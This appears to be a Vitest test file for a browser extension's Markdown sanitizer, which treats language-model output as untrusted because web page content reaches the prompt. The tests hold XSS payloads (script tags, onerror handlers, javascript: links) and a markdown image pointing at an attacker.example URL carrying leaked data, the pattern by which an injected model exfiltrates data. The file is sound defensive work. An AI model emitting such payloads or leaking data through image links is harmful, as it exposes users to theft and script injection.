/**
 * Tests for side_panel/ui/markdown.ts — the single sanitized Markdown → HTML
 * path. Model output is untrusted (the page being read is in the prompt), so
 * nothing it emits may execute, fetch, or restyle the panel.
 */
import { vi, describe, it, expect } from 'vitest';

vi.mock('../../../src/shared/i18n.js', () => ({
  t: (key: string, params?: Record<string, string>) => `[${key}]${params?.alt ?? ''}`,
}));

import { renderMarkdown, sanitizeHtml, parseInertHtml } from '../../../src/side_panel/ui/markdown';

function dom(html: string): HTMLElement {
  const div = document.createElement('div');
  div.innerHTML = html;
  return div;
}

describe('renderMarkdown', () => {
  it('renders ordinary Markdown (gfm + breaks)', () => {
    const el = dom(renderMarkdown('**bold**\nline two\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n```js\nconst x = 1;\n```'));
    expect(el.querySelector('strong')?.textContent).toBe('bold');
    expect(el.querySelector('br')).not.toBeNull();
    expect(el.querySelector('table')).not.toBeNull();
    expect(el.querySelector('pre code')?.textContent).toContain('const x = 1;');
  });

  it('strips scripts and inline event handlers from raw HTML in the answer', () => {
    const el = dom(renderMarkdown('hi <script>alert(1)</script><img src="data:image/png;base64,AAAA" onerror="alert(2)"><b onclick="x()">b</b>'));
    expect(el.querySelector('script')).toBeNull();
    expect(el.innerHTML).not.toMatch(/onerror|onclick|alert/);
  });

  it('never keeps a remote image — it becomes a link the user opens deliberately', () => {
    const html = renderMarkdown('![secret](https://attacker.example/c?d=leak) and <img src="http://evil.example/x.png">');
    const el = dom(html);
    expect(el.querySelector('img')).toBeNull();
    const links = el.querySelectorAll<HTMLAnchorElement>('a.md-blocked-image');
    expect(links).toHaveLength(2);
    expect(links[0].getAttribute('href')).toBe('https://attacker.example/c?d=leak');
    expect(links[0].textContent).toBe('[markdown.blockedImage]secret');
    expect(links[0].getAttribute('rel')).toBe('noopener noreferrer');
  });

  it('keeps inline data: images (they cannot leak anything)', () => {
    const el = dom(renderMarkdown('![chart](data:image/png;base64,iVBORw0KGgo=)'));
    expect(el.querySelector('img')?.getAttribute('src')).toBe('data:image/png;base64,iVBORw0KGgo=');
  });

  it('opens links in a new tab without opener and drops non-http(s) schemes', () => {
    const el = dom(renderMarkdown('[ok](https://example.com) [mail](mailto:a@b.c) [bad](javascript:alert(1)) <a href="data:text/html,x">d</a>'));
    const [ok, mail, bad, data] = Array.from(el.querySelectorAll('a'));
    expect(ok.getAttribute('href')).toBe('https://example.com');
    expect(ok.getAttribute('target')).toBe('_blank');
    expect(ok.getAttribute('rel')).toBe('noopener noreferrer');
    expect(mail.getAttribute('href')).toBe('mailto:a@b.c');
    expect(bad.hasAttribute('href')).toBe(false);
    expect(data.hasAttribute('href')).toBe(false);
  });

  it('removes style tags/attributes and form controls that could fake UI', () => {
    const el = dom(renderMarkdown('<style>body{display:none}</style><div style="position:fixed">x</div><form><input><button>Pay</button></form>'));
    expect(el.querySelector('style, form, input, button')).toBeNull();
    expect(el.querySelector('[style]')).toBeNull();
  });
});

describe('sanitizeHtml', () => {
  it('sanitizes a legacy stored HTML snapshot the same way', () => {
    const el = dom(sanitizeHtml('<p>answer</p><img src="https://x.example/p.gif"><iframe src="https://x.example"></iframe>'));
    expect(el.querySelector('p')?.textContent).toBe('answer');
    expect(el.querySelector('img, iframe')).toBeNull();
    expect(el.querySelector('a.md-blocked-image')).not.toBeNull();
  });
});

describe('parseInertHtml', () => {
  it('parses into a template whose content belongs to an inert document', () => {
    const tpl = parseInertHtml('<img src="https://x.example/p.gif"><p>t</p>');
    expect(tpl.content.ownerDocument).not.toBe(document);
    expect(tpl.content.textContent).toBe('t');
  });
});
